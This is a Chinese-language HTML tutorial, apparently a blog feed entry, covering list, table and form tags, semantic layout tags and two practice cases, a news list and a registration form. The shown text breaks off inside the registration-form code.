    <content type="html"><![CDATA[<h1>列表、表格、表单</h1><blockquote><p>目标：掌握嵌套关系标签的写法，使用列表标签布局网页</p></blockquote><h2 id="01-列表">01-列表</h2><p>作用：布局内容排列整齐的区域。</p><p>列表分类：无序列表、有序列表、定义列表。</p><h3 id="无序列表">无序列表</h3><p>作用：布局排列整齐的<strong>不需要规定顺序</strong>的区域。</p><p>标签：ul 嵌套 li，ul 是无序列表，li 是列表条目。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  ……</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意事项：</p><ul><li>ul 标签里面只能包裹 li 标签</li><li>li 标签里面可以包裹任何内容</li></ul></blockquote><h3 id="有序列表">有序列表</h3><p>作用：布局排列整齐的<strong>需要规定顺序</strong>的区域。</p><p>标签：ol 嵌套 li，ol 是有序列表，li 是列表条目。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三项<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  ……</span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意事项：</p><ul><li>ol 标签里面只能包裹 li 标签</li><li>li 标签里面可以包裹任何内容</li></ul></blockquote><h3 id="定义列表">定义列表</h3><p>标签：dl 嵌套 dt 和 dd，dl 是定义列表，dt 是定义列表的标题，dd 是定义列表的描述 / 详情。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dt</span>&gt;</span>列表标题<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dd</span>&gt;</span>列表描述 / 详情<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">   ……</span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1680315652403.png" alt="1680315652403"></p><blockquote><p>注意事项：</p><ul><li>dl 里面只能包含dt 和 dd</li><li>dt 和 dd 里面可以包含任何内容</li></ul></blockquote><h2 id="02-表格">02-表格</h2><p>网页中的表格与 Excel 表格类似，用来展示数据。</p><p><img src="https://img.777nx.cn/test/1680315690740.png" alt="1680315690740"></p><h3 id="基本使用">基本使用</h3><p>标签：table 嵌套 tr，tr 嵌套 td / th。</p><p><img src="https://img.777nx.cn/test/1680315704565.png" alt="1680315704565"></p><blockquote><p>提示：在网页中，<strong>表格默认没有边框线</strong>，使用 <strong>border 属性</strong>可以为表格添加边框线。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">th</span>&gt;</span>总分<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>99<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>199<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>98<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>198<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>总结<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>全市第一<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>全市第一<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>全市第一<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="表格结构标签-了解">表格结构标签-了解</h3><p>作用：用表格结构标签把内容划分区域，让表格结构更清晰，语义更清晰。</p><p><img src="https://img.777nx.cn/test/1680315774950.png" alt="1680315774950"></p><blockquote><p>提示：表格结构标签可以省略。</p></blockquote><h3 id="合并单元格">合并单元格</h3><p>作用：将多个单元格合并成一个单元格，以合并同类信息。</p><p><img src="https://img.777nx.cn/test/1680315821325.png" alt="1680315812998"></p><p>合并单元格的步骤：</p><ol><li>明确合并的目标</li><li>保留<strong>最左最上</strong>的单元格，添加属性（取值是<strong>数字</strong>，表示需要<strong>合并的单元格数量</strong>）<ul><li><strong>跨行合并</strong>，保留最上单元格，添加属性 <strong>rowspan</strong></li><li><strong>跨列合并</strong>，保留最左单元格，添加属性 <strong>colspan</strong></li></ul></li><li>删除其他单元格</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>总分<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>张三<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>99<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span>100<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>199<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>李四<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>98<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- &lt;td&gt;100&lt;/td&gt; --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>198<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>总结<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;3&quot;</span>&gt;</span>全市第一<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- &lt;td&gt;全市第一&lt;/td&gt;</span></span><br><span class="line"><span class="comment">      &lt;td&gt;全市第一&lt;/td&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tfoot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：不能跨表格结构标签合并单元格（thead、tbody、tfoot）。</p></blockquote><h2 id="03-表单">03-表单</h2><p>作用：收集用户信息。</p><p>使用场景：</p><ul><li>登录页面</li><li>注册页面</li><li>搜索区域</li></ul><h3 id="input-标签">input 标签</h3><p>input 标签 type 属性值不同，则功能不同。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;...&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1680315984539.png" alt="1680315984539"></p><h3 id="input-标签占位文本">input 标签占位文本</h3><p>占位文本：提示信息，文本框和密码框都可以使用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;...&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;提示信息&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="单选框">单选框</h3><p>常用属性</p><p><img src="https://img.777nx.cn/test/1680316056402.png" alt="1680316056402"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">checked</span>&gt;</span> 男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span>&gt;</span> 女</span><br></pre></td></tr></table></figure><blockquote><p>提示：name 属性值自定义。</p></blockquote><h3 id="上传文件">上传文件</h3><p>默认情况下，文件上传表单控件只能上传一个文件，添加 multiple 属性可以实现文件多选功能。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">multiple</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="多选框">多选框</h3><p>多选框也叫复选框，默认选中：checked。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">checked</span>&gt;</span> 敲前端代码</span><br></pre></td></tr></table></figure><h3 id="下拉菜单">下拉菜单</h3><p><img src="https://img.777nx.cn/test/1680316175031.png" alt="1680316175031"></p><p>标签：select 嵌套 option，select 是下拉菜单整体，option是下拉菜单的每一项。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>武汉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>默认显示第一项，<strong>selected</strong> 属性实现<strong>默认选中</strong>功能。</p></blockquote><h3 id="文本域">文本域</h3><p>作用：多行输入文本的表单控件。</p><p><img src="https://img.777nx.cn/test/1680316238194.png" alt="1680316238194"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>默认提示文字<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意点：</p><ul><li>实际开发中，使用 CSS 设置 文本域的尺寸</li><li>实际开发中，一般禁用右下角的拖拽功能</li></ul></blockquote><h3 id="label-标签">label 标签</h3><p>作用：网页中，某个标签的说明文本。</p><p><img src="https://img.777nx.cn/test/1680316296894.png" alt="1680316296894"></p><p>经验：用 label 标签绑定文字和表单控件的关系，增大表单控件的点击范围。</p><p><img src="https://img.777nx.cn/test/1680316314721.png" alt="1680316314721"></p><ul><li>写法一<ul><li>label 标签只包裹内容，不包裹表单控件</li><li>设置 label 标签的 for 属性值 和表单控件的 id 属性值相同</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;man&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;man&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>写法二：使用 label 标签包裹文字和表单控件，不需要属性</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span>&gt;</span> 女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>提示：支持 label 标签增大点击范围的表单控件：文本框、密码框、上传文件、单选框、多选框、下拉菜单、文本域等等。</p></blockquote><h3 id="按钮">按钮</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/1680316426088.png" alt="1680316426088"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- form 表单区域 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- action=&quot;&quot; 发送数据的地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 如果省略 type 属性，功能是 提交 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>普通按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>提示：按钮需配合 form 标签（表单区域）才能实现对应的功能。</p></blockquote><h2 id="04-语义化">04-语义化</h2><h3 id="无语义的布局标签">无语义的布局标签</h3><p>作用：布局网页（划分网页区域，摆放内容）</p><ul><li>div：独占一行</li><li>span：不换行</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>div 标签，独占一行<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>span 标签，不换行<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="有语义的布局标签">有语义的布局标签</h3><p><img src="https://img.777nx.cn/test/1680316535685.png" alt="1680316535685"></p><h2 id="05-字符实体">05-字符实体</h2><p><img src="https://img.777nx.cn/test/1680316551064.png" alt="1680316551064"></p><h2 id="06-综合案例一-体育新闻列表">06-综合案例一-体育新闻列表</h2><p><img src="https://img.777nx.cn/test/1680316581559.png" alt="1680316581559"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./images/1.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>主帅安东尼奥回西班牙休假 国青抵达海口进行隔离<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./images/2.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>梅州主帅：申花有强有力的教练组 球员体能水平高<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./images/3.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>马德兴:00后球员将首登亚洲舞台 调整心态才务实<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="07-综合案例二-注册信息">07-综合案例二-注册信息</h2><p><img src="https://img.777nx.cn/test/1680316627956.png" alt="1680316627956"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>注册信息<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 表单控件 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 个人信息 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>个人信息<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入真实姓名&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入密码&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>确认密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入确认密码&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>性别：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span>&gt;</span> 男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">checked</span>&gt;</span> 女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span>&gt;</span>居住城市：<span class="tag">&lt;/<span 